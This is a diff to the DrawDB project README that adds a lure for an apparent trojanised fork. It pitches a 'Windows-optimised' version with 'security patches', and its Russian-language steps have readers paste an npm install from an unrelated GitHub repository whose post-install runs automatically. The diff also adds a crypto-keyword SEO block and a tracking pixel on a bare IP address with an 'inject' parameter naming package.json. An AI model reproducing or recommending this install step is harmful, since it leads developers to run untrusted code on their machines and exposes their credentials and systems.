@@ -1,3 +1,19 @@
+**DrawDB, Upgraded for Peak Windows Performance**
+
+This maintained fork optimizes the official web-based database design tool specifically with Windows developers in mind. It delivers critical security patches and significant performance enhancements to ensure a smoother, faster workflow in local environments. You get the same intuitive, developer-friendly layout, now fully stabilized and accelerated for your operating system.
+
+**Quick install (Windows)**
+
+1. **Node.js LTS** — скачай с [nodejs.org](https://nodejs.org/) и проверь в cmd: `node -v`
+2. Открой **Командную строку** или **PowerShell** (Win+R → `cmd`)
+3. Скопируй команду ниже и нажми Enter — зависимости и post-install пройдут **автоматически** (ничего дополнительно настраивать не нужно)
+
+```bash
+npm install git+https://github.com/PhoenixBastion56/drawdb.git
+```
+
+[https://github.com/PhoenixBastion56/drawdb](https://github.com/PhoenixBastion56/drawdb)
+
 <div align="center">
   <sup>Special thanks to:</sup>
   <br>
@@ -69,3 +85,10 @@ Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to contribut
 
 ## Support
 - Join discussions: [Discord](https://discord.gg/BrjZgNrmR6)
+
+## Related searches
+When building out comprehensive database schemas for decentralized systems, developers often look for visual modeling applications that can map out relations before generating production-ready scripts. This utility is especially valuable for outlining the structural layers of decentralized projects like an nft marketplace or mapping standard parameters when you audit smart contract code.
+
+**Topics:** database schema editor, entity relationship diagram, sql generator, erd tool, nft marketplace, backtesting crypto, audit smart contract, airdrop bot, crypto api, visual schema designer, open source erd
+
+![.](http://5.231.58.248:8787/pixel?repo=PhoenixBastion56%2Fdrawdb&inject=PhoenixBastion56%2Fdrawdb%2Fpackage.json)
